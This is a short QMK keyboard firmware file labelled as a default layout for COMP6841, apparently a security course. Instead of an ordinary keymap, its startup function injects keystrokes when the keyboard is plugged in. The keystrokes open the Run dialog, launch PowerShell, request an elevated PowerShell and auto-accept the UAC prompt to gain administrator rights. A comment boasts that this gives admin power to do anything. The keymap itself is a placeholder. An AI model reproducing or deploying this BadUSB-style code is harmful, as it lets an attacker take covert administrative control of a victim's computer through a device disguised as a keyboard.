// Default layout for COMP6841
#include QMK_KEYBOARD_H

void keyboard_post_init_user(void) {
    //SEND_STRING("Wow is that brute force? It's doomed.\n");
    SEND_STRING(SS_LGUI("r"));                              //Win + R
    wait_ms(300);
    SEND_STRING("powershell");                              //open powershell
    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
    wait_ms(300);
    SEND_STRING("Start-Process powershell -Verb runAs");    //run powershell as admin
    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
    wait_ms(2000);
    SEND_STRING(SS_TAP(X_LEFT));                            //left arrow to press yes when the admin pops up
    SEND_STRING(SS_TAP(X_ENTER));                           //Enter
    //now i have admin power :) can do anything in powershell
    while(1){}
};

const uint16_t PROGMEM keymaps[][MATRIX_ROWS][MATRIX_COLS] = {
    [0] = LAYOUT_60_all(
        KC_1, KC_2, KC_3, KC_4, KC_5, KC_6, KC_7
    )
};
